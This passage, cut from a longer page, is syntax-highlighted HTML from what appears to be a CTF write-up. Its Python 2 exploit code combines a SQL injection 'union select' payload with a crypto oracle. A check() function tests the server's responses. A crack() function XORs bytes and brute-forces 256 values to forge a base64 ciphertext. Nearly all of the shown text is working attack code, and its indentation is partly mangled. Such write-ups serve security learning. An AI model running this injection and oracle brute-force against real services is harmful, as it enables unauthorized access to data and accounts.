nion select '123','%s'--"</span>%str,<span class="string">"password"</span>:<span class="string">"0"</span>&#125;</span><br><span class="line">    )</span><br><span class="line"><span class="comment">#    print r.text</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(cipher,ans)</span>:</span></span><br><span class="line">    ans2=<span class="string">''</span></span><br><span class="line">    cipher = base64.b64decode(cipher)<span class="comment">#'bideUVTUQFsz555b0yuaFQ=='</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ans)):</span><br><span class="line">    ans2=ans2+chr(ord(ans[i]) ^ (len(ans)-i) ^ (len(ans)+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'.'</span>,</span><br><span class="line">        <span class="keyword">if</span> check(base64.b64encode(<span class="string">'\x00'</span>*(<span class="number">15</span>-len(ans2))+chr(i)+ans2+cipher)):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n[+]succ with\n'</span>+base64.b64encode(<span class="string">'\x00'</span>*(<span class="number">15</span>-len(ans2))+chr(i)+ans2+cipher)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">
